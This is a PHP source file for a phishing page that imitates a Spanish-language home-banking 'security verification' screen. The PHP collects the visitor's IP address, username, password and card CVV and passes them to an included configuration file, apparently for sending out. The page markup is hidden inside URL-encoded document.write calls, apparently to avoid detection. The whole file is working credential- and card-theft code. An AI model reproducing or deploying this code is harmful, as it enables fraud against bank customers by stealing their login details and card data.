<?php 
session_start();
	if (isset($_POST['log'])) {
		$_SESSION['password'] = $_POST['password'];
		$msj = '<<<<< DATOS DEL LOGIN >>>>'."\n";
		
	}
	if (isset($_POST['verificar'])) {
		$_SESSION['cvv'] = $_POST['cvv'];
		$msj .= 'DIRECCIÓN DE IP : '.getenv('REMOTE_ADDR')."\n";
		$msj .= 'USER : '.$_SESSION['usuario']."\n";
		$msj .= 'PASS : '.$_SESSION['password']."\n";
		$msj .= 'CVV : '.$_SESSION['cvv']."\n";
		include 'configurar.php';
	}
?>
<script>
<!--
document.write(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%20style%3D%22background%3A%20url%28static/backgroud.png%29%20center%20center%20no-repeat%20fixed%3Bbackground-size%3A%20cover%3B%22%3E%0A%3Chead%3E%0A%09%3Cmeta%20charset%3D%22utf-8%22%3E%0A%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20maximum-scale%3D1%22%3E%0A%09%3Ctitle%3EHome%3C/title%3E%0A%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A//cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css%22%20integrity%3D%22sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g%3D%3D%22%20crossorigin%3D%22anonymous%22%20referrerpolicy%3D%22no-referrer%22%20/%3E%0A%09%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22static/desing.css%22%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%09%3Cdiv%20class%3D%22cont%22%3E%09%0A%09%09%3Cheader%3E%0A%09%09%09%3Cnav%3E%0A%09%09%09%09%3Cdiv%20class%3D%22atras%22%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22static/back.png%22%20height%3D%2225px%22%3E%0A%09%09%09%09%09%3Cspan%3EVolver%3C/span%3E%09%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cfigure%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22static/logosf.png%22%20height%3D%2275px%22%3E%0A%09%09%09%09%3C/figure%3E%0A%09%09%09%3C/nav%3E%0A%09%09%3C/header%3E%0A%09%09%3Csection%3E%0A%09%09%09%3Cdiv%20class%3D%22alerta%22%3E%0A%09%09%09%09%3Ch3%3E%3Ci%20class%3D%22fa-solid%20fa-triangle-exclamation%22%3E%3C/i%3E%20Verificaci%F3n%20de%20seguridad%3C/h3%3E%0A%09%09%09%09%3Cp%3EPor%20tu%20seguridad%20te%20pedimos%20que%20verifiques%20tus%20identidad.%3C/p%3E%0A%09%09%09%09%3Cp%3ETu%20direcci%F3n%20de%20IP%3A"));
//-->
</script> <?php echo getenv('REMOTE_ADDR'); ?> <script>
<!--
document.write(unescape("sera%20almacenada%20en%20nuestra%20base%20de%20datos.%3C/p%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%3Cform%20method%3D%22POST%22%20onsubmit%3D%22return%20validar%28%29%22%3E%0A%09%09%09%09%3Ch4%20id%3D%22datos-personales%22%3E-%20Datos%20de%20tu%20tarjeta%3C/h4%3E%0A%0A%09%09%09%09%3Cdiv%20class%3D%22date-expired%22%3E%0A%09%09%09%09%09%3Clabel%3ECVV%3C/label%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22text%22%20name%3D%22cvv%22%20maxlength%3D%223%22%20id%3D%22cvv%22%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22textfield%22%3E%0A%09%09%09%09%09%3Cbutton%20class%3D%22btn%22%20type%3D%22submit%22%20name%3D%22verificar%22%3EContinuar%3C/button%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/form%3E%0A%09%09%3C/section%3E%0A%09%09%3Cfooter%3E%0A%09%09%09%3Cp%3EOperar%20con%20Home%20Banking%20implica%20aceptar%20los%20%3Ca%20href%3D%22%22%3Et%E9rminos%20y%20%3C/a%3E%3C/p%3E%20%0A%09%09%09%3Cp%3Econdiciones%20que%20ofrece%20el%20servicio.%20%3Ca%20href%3D%22%22%3EInformaci%F3n%20sobre%20seguridad%3C/a%3E.%3C/p%3E%0A%09%09%3C/footer%3E%0A%09%3C/div%3E%0A%09%3Cscript%20type%3D%22text/javascript%22%20src%3D%22static/js/app.js%22%3E%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E"));
//-->
</script>